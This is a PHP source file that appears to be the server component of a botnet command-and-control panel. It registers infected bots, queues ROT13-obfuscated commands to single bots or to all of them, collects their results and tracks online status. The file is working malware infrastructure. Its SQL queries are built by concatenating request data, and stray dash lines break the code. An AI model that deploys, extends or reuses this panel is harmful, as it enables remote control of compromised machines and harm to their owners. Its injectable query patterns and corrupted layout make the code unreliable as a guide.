<?php
function ConnectToDB($server, $user, $pw, $dbname)
{
	$con = mysql_connect($server, $user, $pw);
	$db = mysql_select_db($dbname);
}

function CloseConnectionToDB()
{
	mysql_close();
}
-----------------------------------------------------
------------------------------------------------------
function AddBotToDB($serial, $name, $status) 
{
	mysql_query("INSERT INTO botlisting(serial, name, status, time, ip) VALUES('" . $serial . "','" . $name . "','" . $status . "'," . time() . ", '" . $_SERVER['REMOTE_ADDR'] . "');");
}
------------------------------------------------
function AddResultToLog($name, $result)
{
	$result = str_rot13($result);
	
	mysql_query("INSERT INTO loglisting(command) VALUES('<" . $name . "> " . $result . "');");
}

function ShowAndDeleteCommandsForBot($botid)
{
	$result = mysql_query("SELECT * FROM botlisting INNER JOIN commandlisting ON botlisting.ID=commandlisting.botID WHERE ID=" . $botid . ";");
	while($row = mysql_fetch_array($result))
	{
		$temp = $row['command'];

		echo(str_rot13($temp) . "\n");	
	}
	
	$result = mysql_query("DELETE FROM commandlisting WHERE botID=" . $botid . ";");
}
--------------------------------------------------------------------------
----------------------------------------------------------------------------
function IsBotInDB($serial, $name)
{
	$result = mysql_query("SELECT * FROM botlisting WHERE serial='" . $serial . "' AND name='" . $name . "';");
	if($row = mysql_fetch_array($result))
	{
		return true;
	}
	else
	{
		return false;
	}
}
------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------
function GetBotID($serial, $name)
{
	$result = mysql_query("SELECT * FROM botlisting WHERE serial='" . $serial . "' AND name='" . $name . "';");
	$row = mysql_fetch_array($result);
	
	return $row['ID'];
}
----------------------------------------------------------------------------------
function UpdateBotStatus($serial, $name, $status, $own)
{	
	$result = mysql_query("SELECT * FROM botlisting WHERE serial='" . $serial . "' AND name='" . $name . "';");
	$row = mysql_fetch_array($result);
	
	if($own==true)
	{
		mysql_query("UPDATE botlisting SET status='" . $status . "', time=" . time() . ", ip='" . $_SERVER['REMOTE_ADDR'] . "' WHERE id=" . $row['ID'] . ";");
	}
	else
	{
		mysql_query("UPDATE botlisting SET status='" . $status . "', time=" . $row['time'] . ", ip='" . $row['ip'] . "' WHERE id=" . $row['ID'] . ";");
	}
}

function GetBotStatus($serial, $name)
{
	$result = mysql_query("SELECT status FROM botlisting WHERE serial='" . $serial . "' AND name='" . $name . "';");
	$row = mysql_fetch_array($result);
	
	return $row['status'];
}

function UpdateBotStatusList($timeout, $serial, $name)
{
	$timestamp = time();
	
	$result = mysql_query("SELECT * FROM botlisting;");
	while($row = mysql_fetch_array($result))
	{
		if($row['time']+$timeout < $timestamp)
		{
			if($serial==$row['serial'] && $name==$row['name'])
			{
				UpdateBotStatus($row['serial'], $row['name'], "Offline", true);
			}
			else
			{
				UpdateBotStatus($row['serial'], $row['name'], "Offline", false);
			}
		}
	}
}

function ShowBotName()
{
	$queueselect = $_POST['queueselect'];
	
	$result = mysql_query("SELECT * FROM botlisting INNER JOIN commandlisting ON botlisting.ID=commandlisting.botID WHERE cmdID=" . $queueselect[0] . ";");
	$row = mysql_fetch_array($result);
		
	echo($row['name']);	
}
-----------------------------------------------------------
------------------------------------------------
function EditCommandForBot()
{
	$commandid = $_POST['commandid'];
	$cmd = $_POST['cmd'];
	
	$result = mysql_query("UPDATE commandlisting SET command='" . $cmd . "' WHERE cmdID=" . $commandid . ";");
}
---------------------------------------------------------------------
------------------------------------------------------------------------
function ShowCommand()
{
	$queueselect = $_POST['queueselect'];

	$result = mysql_query("SELECT * FROM commandlisting WHERE cmdID=" . $queueselect[0] . ";");
	$row = mysql_fetch_array($result);
	
	echo($row['command']);
}
------------------------------------------------------------------------
--------------------------------------------------------------------------
function ShowAllBots()
{
	$result = mysql_query("SELECT * FROM botlisting;");
	
	$botselect = $_POST['botselect'];
	
	if($botselect[0]==-1 || !isset($_POST['botselect']))
	{
		echo('<option value="-1" selected>All</option>' . "\n");
	}
	else
	{
		echo('<option value="-1">All</option>' . "\n");
	}
	
	while($row = mysql_fetch_array($result))
	{
		$i=0;
		$bot_selected=0;
		while($value=$botselect[$i])
		{
			if($value==$row['ID'])
			{
				$bot_selected=1;
				break;			
			}
			$i+=1;
		}
		
		if($bot_selected==1)
		{
			echo('<option value="' . $row['ID'] . '" selected>' . $row['status'] . ' ' . $row['ip'] . ' ' . $row['name'] . '</option>' . "\n");
		}
		else
		{
			echo('<option value="' . $row['ID'] . '">' . $row['status'] . ' ' . $row['ip'] . ' ' . $row['name'] . '</option>' . "\n");
		}
	}
}
--------------------------------------------------------------------------
function ShowAllBotsCmdList()
{
	$result = mysql_query("SELECT * FROM botlisting;");
	
	$botselect = $_POST['botselect'];
	
	if($botselect[0]==-1 || !isset($_POST['botselect']))
	{
		echo('<option value="-1" selected>All</option>' . "\n");
	}
	else
	{
		echo('<option value="-1">All</option>' . "\n");
	}
	
	while($row = mysql_fetch_array($result))
	{
		if($botselect==$row['ID'])
		{
			echo('<option value="' . $row['ID'] . '" selected>' . $row['name'] . ' ' . $row['status'] . '</option>' . "\n");
		}
		else
		{
			echo('<option value="' . $row['ID'] . '">' . $row['name'] . ' ' . $row['status'] . '</option>' . "\n");
		}
	}
}
-------------------------------------------------------------------
---------------------------------------------------------------------
function AddBotCommand($botid, $cmd)
{
	mysql_query("INSERT INTO commandlisting(botID, command) VALUES(" . $botid . ",'" . $cmd . "');");
}
-----------------------------------------------------------
function AddBotCommandToLog($cmd)
{
	mysql_query("INSERT INTO loglisting(command) VALUES('<BotOwner> " . $cmd . "');");
}

function AddBotCommandToAll($cmd)
{	
	$result = mysql_query("SELECT * FROM botlisting;");
	
	while($row = mysql_fetch_array($result))
	{
		mysql_query("INSERT INTO commandlisting(botID, command) VALUES(" . $row['ID'] . ",'" . $cmd . "');");
	}	
}

function ShowLog()
{
	$result = mysql_query("SELECT * FROM loglisting ORDER BY ID ASC;");
	
	while($row = mysql_fetch_array($result))
	{
		echo($row['command'] . "\n");
	}
}

function DeleteLog()
{
	mysql_query("TRUNCATE loglisting;");
}

function DeleteCommandsFromQueue()
{
	$botselect = $_POST['botselect'];
	$queueselect = $_POST['queueselect'];
	
	if($botselect==-1 && $queueselect[0]==-1)
	{
		mysql_query("TRUNCATE commandlisting;");
	}
	else if($queueselect[0]==-1)
	{
		mysql_query("DELETE FROM commandlisting WHERE botID=" . $botselect . ";");
	}
	else
	{
		$i=0;
		while($value=$queueselect[$i])
		{
			mysql_query("DELETE FROM commandlisting WHERE cmdID=" . $value . ";");
			$i+=1;
		}
	}
}

function ShowCommandQueue()
{
	$botselect = $_POST['botselect'];
	
	if($botselect==-1 || !isset($_POST['botselect']))
	{	
		$result = mysql_query("SELECT * FROM botlisting INNER JOIN commandlisting ON botlisting.ID=commandlisting.botID ORDER BY botlisting.ID ASC, cmdID ASC;");
	}
	else
	{
		echo($botselect);
		$result = mysql_query("SELECT * FROM botlisting INNER JOIN commandlisting ON botlisting.ID=commandlisting.botID WHERE commandlisting.botID=" . $botselect . " ORDER BY botlisting.ID ASC, cmdID ASC;");
	}
	
	echo('<option value="-1" selected>All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>' . "\r\n");
	
	while($row = mysql_fetch_array($result))
	{
		if($botselect==-1 || !isset($_POST['botselect']))
		{
			echo('<option value="' . $row['cmdID'] . '">' . $row['name'] . ' -> ' . $row['command'] .  '</option>' . "\n");
		}
		else
		{
			echo('<option value="' . $row['cmdID'] . '">' . $row['command'] .  '</option>' . "\n");
		}
	}
}

?>